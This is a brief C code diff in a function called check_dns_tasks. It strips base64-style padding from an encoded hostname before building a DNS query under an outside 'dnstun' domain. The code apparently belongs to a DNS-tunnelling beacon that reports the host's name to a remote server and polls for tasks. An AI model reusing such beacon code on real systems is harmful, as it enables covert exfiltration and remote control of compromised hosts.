@@ -12,6 +12,7 @@ void check_dns_tasks()
     char requeststring[600];
     char tmp[256];
     char tmp2[256];
+    int killequals;
 
     // encode myhostnamee
 #ifdef TESTING
@@ -23,6 +24,12 @@ void check_dns_tasks()
 #ifdef TESTING
     printf ("Encoded hostname is %s\n",tmp);
 #endif
+
+    //Get rid of equals
+    killequals = strlen(tmp);
+    if (tmp[killequals] == '=') tmp[killequals] = '\0';  //think this never hits because zero based, but keeping
+    if (tmp[killequals-1] == '=') tmp[killequals-1] = '\0';
+    if (tmp[killequals-2] == '=') tmp[killequals-2] = '\0';
 
     _snprintf(requeststring, sizeof(requeststring),"%s.dnstun.multifariousnonsense.com", tmp);
 
